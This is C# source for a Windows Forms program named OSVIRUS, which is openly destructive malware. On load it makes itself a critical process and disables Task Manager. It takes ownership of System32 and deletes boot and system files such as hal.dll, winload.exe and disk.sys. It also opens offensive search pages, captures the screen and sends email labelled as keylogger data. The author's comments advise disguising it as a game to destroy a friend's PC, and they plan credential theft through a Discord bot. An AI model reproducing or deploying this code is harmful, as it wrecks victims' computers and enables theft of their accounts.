using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Mail;
using System.Drawing.Imaging;
using Microsoft.Win32;
using System.Text;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Media;
using System.Security.Cryptography;
using System.Net.Sockets;
using System.Net;

namespace WindowsFormsApp1
{
    public partial class OSVIRUS : Form
    {
        private SoundPlayer _soundplayer;

        string sound_file = @"C:\Windows\Media\Windows Critical Stop.wav"; // defined sound
        string sound_file_dying = @"C:\Windows\Media\Windows Battery Low.wav"; // defined sound
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        public OSVIRUS()
        {
            InitializeComponent();
            // Any help on this malware is apreciated.
            // However i advise not downloading this and using it on your own PC.
            // If you do download it and you wanna destory someones pc:
            // Rename it to something convinicing
            // Like a popular game name and alter the picture to its icon.
            // Customize then send to a friend
            // And there PC Will die.
            // Also im planning on adding a KEY LOGGING SYSTEM.
            // Which sends it to a discord bot you make in a txt
            // Like roblox username password
            // Gmail password and account
            // More stuff like that so help a guy out please!
        }

        private void Form1_Close(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Process.EnterDebugMode(); // gets debug options to iniate a blue screen o' death and delete all your things!
            int isCritical = 1;  // we want this to be a Critical Process
            int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
            RegistryKey rk = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            rk.SetValue("DisableTaskMgr", 1, RegistryValueKind.String); // turn off task manager
            // This line of code activates a script
            //get system32 folder and drivers
            new Process() { StartInfo = new ProcessStartInfo("cmd.exe", @"/k color 47 && takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant %username%:F && takeown /f C:\Windows\System32\drivers && icacls C:\Windows\System32\drivers /grant %username%:F && Exit") }.Start();
            string hal_dll = @"C:\Windows\System32\hal.dll";
            string ci_dll = @"C:\Windows\System32\ci.dll";
            string winload_exe = @"C:\Windows\System32\winload.exe";
            string disk_sys = @"C:\Windows\System32\drivers\disk.sys";
            string memoryanyalizer = @"C:\Windows\System32\F12\MemoryAnalyzer.dll"; //C:\Windows
            string notepad = @"C:\Windows\notepad.exe";
            string fileexplorer = @"C:\Windows\explorer.exe";
            if (File.Exists(hal_dll))
            {
                File.Delete(hal_dll);
                if (File.Exists(sound_file_dying))
                {
                    _soundplayer = new SoundPlayer(@"C:\Windows\Media\Windows Battery Low.wav");
                    _soundplayer.Play(); //play sound
                }
            }
            if (File.Exists(ci_dll))
            {
                File.Delete(ci_dll);
                if (File.Exists(sound_file_dying))
                {
                    _soundplayer = new SoundPlayer(@"C:\Windows\Media\Windows Battery Low.wav");
                    _soundplayer.Play(); //play sound
                }
            }
            if (File.Exists(winload_exe))
            {
                File.Delete(winload_exe);
                if (File.Exists(sound_file_dying))
                {
                    _soundplayer = new SoundPlayer(@"C:\Windows\Media\Windows Battery Low.wav");
                    _soundplayer.Play(); //play sound
                }
            }
            if (File.Exists(disk_sys))
            {
                File.Delete(disk_sys);
                if (File.Exists(sound_file_dying))
                {
                    _soundplayer = new SoundPlayer(@"C:\Windows\Media\Windows Battery Low.wav");
                    _soundplayer.Play(); //play sound
                }
            }
            if (File.Exists(memoryanyalizer))
            {
                File.Delete(memoryanyalizer);
                if (File.Exists(sound_file_dying))
                {
                    _soundplayer = new SoundPlayer(@"C:\Windows\Media\Windows Battery Low.wav");
                    _soundplayer.Play(); //play sound
                }
            }
            if (File.Exists(notepad))
            {
                File.Delete(notepad);
                if (File.Exists(sound_file_dying))
                {
                    _soundplayer = new SoundPlayer(@"C:\Windows\Media\Windows Battery Low.wav");
                    _soundplayer.Play(); //play sound
                }
            }
            if (File.Exists(fileexplorer))
            {
                File.Delete(fileexplorer);
                if (File.Exists(sound_file_dying))
                {
                    _soundplayer = new SoundPlayer(@"C:\Windows\Media\Windows Battery Low.wav");
                    _soundplayer.Play(); //play sound
                }
            }
            // Now we get annoying with opening screens.
            Random r;
            r = new Random();
            int true_num = r.Next(5); //make random num 1-5 (P.S: the random number hi-graph here is for the below but can also be used for other stuff)

            if (true_num == 1)
            {
                System.Diagnostics.Process.Start("https://www.youtube.com/channel/UC9keh4wDjXFyiRhHDE_h90Q?view_as=subscriber"); //System.Diagnostics.Process.Start("https://www.youtube.com/channel/UC9keh4wDjXFyiRhHDE_h90Q?view_as=subscriber");
            }

            if (true_num == 2)
            {
                if (MessageBox.Show("Never gonna give you up never gonna let ya down.", "WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) == DialogResult.No);
                System.Diagnostics.Process.Start("https://www.youtube.com/channel/UCviSYAcwdnDX1UoRzAHYgNg");
            }

            if (true_num == 3)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?sxsrf=ALeKk03p6_nh5gjKk_7WWWGDr0qYtnieXg%3A1605092222038&ei=fsOrX5rzAY63kwWYq56IDg&q=my+mum+is+gay&oq=my+mum+is+gay&gs_lcp=CgZwc3ktYWIQAzIKCAAQFhAKEB4QEzIKCAAQFhAKEB4QEzoJCCMQ6gIQJxATOgcIIxDqAhAnOgQIIxAnOgUIABCxAzoCCAA6CAgAELEDEIMBOgIILjoECAAQQzoHCC4QsQMQQzoECC4QQzoFCC4QsQM6CAguELEDEIMBOgUILhCTAjoECC4QCjoECAAQCjoFCC4QywE6BQgAEMsBOggILhDLARCTAjoGCAAQFhAeOggIABAWEAoQHlD_GliuO2D3PGgCcAB4AIABiwKIAeAOkgEGMS4xMi4xmAEAoAEBqgEHZ3dzLXdperABCsABAQ&sclient=psy-ab&ved=0ahUKEwiaque9qvrsAhWO26QKHZiVB-EQ4dUDCA0&uact=5");
            }

            if (true_num == 4)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?sxsrf=ALeKk007atE4-A-mD40nsEcYaIJklYlv_g%3A1605092231197&ei=h8OrX5XEC4mdkwXO84XoAg&q=how+2+cut+leg&oq=how+2+cut+leg&gs_lcp=CgZwc3ktYWIQDDIICCEQFhAdEB4yCAghEBYQHRAeMggIIRAWEB0QHjIICCEQFhAdEB4yCAghEBYQHRAeMggIIRAWEB0QHjIICCEQFhAdEB4yCAghEBYQHRAeMggIIRAWEB0QHjoJCCMQ6gIQJxATOgcIIxDqAhAnOgQIIxAnOgQIABBDOgUIABCxAzoKCAAQsQMQgwEQQzoCCC46CAguELEDEIMBOgIIADoFCC4QsQM6BQguEMsBOgUIABDLAToGCAAQFhAeOggIABAWEAoQHlDzaFiDigFg86UBaANwAHgAgAHzAYgB7w2SAQYwLjEyLjGYAQCgAQGqAQdnd3Mtd2l6sAEKwAEB&sclient=psy-ab&ved=0ahUKEwjVo5bCqvrsAhWJzqQKHc55AS0Q4dUDCA0");
            }

            if (true_num == 5)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=dancing+cow&sxsrf=ALeKk03Rx29J4Nduy2BetYRf6PUHNs9I8A:1605092295881&source=lnms&tbm=isch&sa=X&ved=2ahUKEwiupoLhqvrsAhUdJcUKHdqKANwQ_AUoAXoECAcQAw&biw=1920&bih=937");
            }
            // This part of the virus used to make a sound but i have instead made checks for it not too.
            if (File.Exists(sound_file))
            {
                _soundplayer = new SoundPlayer(@"C:\Windows\Media\Windows Critical Stop.wav");
                _soundplayer.Play(); //play sound
            }
            // _soundplayer.Play(); //play sound
            // This part makes your entire screen buggy
            Graphics g;
            Bitmap bmp;
            var endWidth = 500;
            var endHeight = 500;

            var scaleFactor = 1; //perhaps get this value from a const, or an on screen slider

            var startWidth = endWidth / scaleFactor;
            var startHeight = endHeight / scaleFactor;

            bmp = new Bitmap(startWidth, startHeight);

            g = this.CreateGraphics();
            g = Graphics.FromImage(bmp);

            var xPos = Math.Min(0, MousePosition.X - (startWidth / 500)); // divide by two in order to center
            var yPos = Math.Min(0, MousePosition.Y - (startHeight / 500));

            g.CopyFromScreen(xPos, yPos, 0, 0, new Size(endWidth, endWidth));
            var Pictur1 = new PictureBox();
            Pictur1.BackColor = Color.Transparent;
            Pictur1.Height = 300;
            Pictur1.Width = 300;
            Pictur1.Location = new Point(r.Next(0, Screen.PrimaryScreen.Bounds.Width),
            r.Next(0, Screen.PrimaryScreen.Bounds.Height));

            Controls.Add(Pictur1);
            Pictur1.Image = bmp;
            Bitmap pic = new Bitmap(Pictur1.Image);
            for (int y = 0; (y <= (pic.Height - 1)); y++)
            {
                for (int x = 0; (x <= (pic.Width - 1)); x++)
                {
                    Color inv = pic.GetPixel(x, y);
                    inv = Color.FromArgb(255, (255 - inv.R), (255 - inv.G), (255 - inv.B));
                    pic.SetPixel(x, y, inv);
                }
            }
            Pictur1.Image = pic;
            // The next line of code sends emails and more.
            int mailTime = 5000;
            MailMessage mail = new MailMessage();
            SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");

            mail.From = new MailAddress("ThisGuyGotHAXED!");
            mail.To.Add("dont be stupid!");
            //mail.Subject = "Keylogger date: " + DateTime.Now.ToLongDateString(); // will use soon
            mail.Subject = "Keylogger date: " + mailTime; // test of using mailtime system.
            mail.Body = "Information key from victim\n";
            SmtpServer.Port = 587;
            SmtpServer.Credentials = new System.Net.NetworkCredential("ThisGuyGotHAXED!", "dont be stupid!");
            SmtpServer.EnableSsl = true;
            SmtpServer.SendMailAsync("Hello there this is a hacked email!", "whyareyousosus@gmail.com", "Hacked email sent", "hi");
            SmtpServer.Send(mail); // Actually sending the fridgin mail.
            // Blocking a port.
            int portToBlock = 80;
            Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP);
            IPEndPoint ep = new IPEndPoint(IPAddress.Loopback, portToBlock);
            s.Bind(ep);
            // Whatever this function does or somethin (PS: I added this to encrypt files but i didnt know how to fix some of it so i removed the broken code)
            /*string password = "Hu11an_!ndusTr!al";
            GCHandle gch = GCHandle.Alloc(password, GCHandleType.Pinned);
            gch.Free(); */
            // IP Grabbing
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    ip.ToString();
                }
            }
            // Capture the screen. I think i should make a way for it to auto-upload to a website.
            Rectangle size = Screen.GetBounds(Point.Empty);
            Bitmap captureBitmap = new Bitmap(size.Width, size.Height, PixelFormat.Format32bppArgb);
            Rectangle captureRectangle = Screen.AllScreens[0].Bounds;
            Graphics captureGraphics = Graphics.FromImage(captureBitmap);
            captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
            captureBitmap.Save(@"Capture.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
            // captureBitmap.UploadToWebsite("https://drive.google.com/drive/my-drive");
            // This line of code creates a bunch of ping and removes discord. PLEASE CODE THIS FOR ME PEOPLE!
        }
    }
}
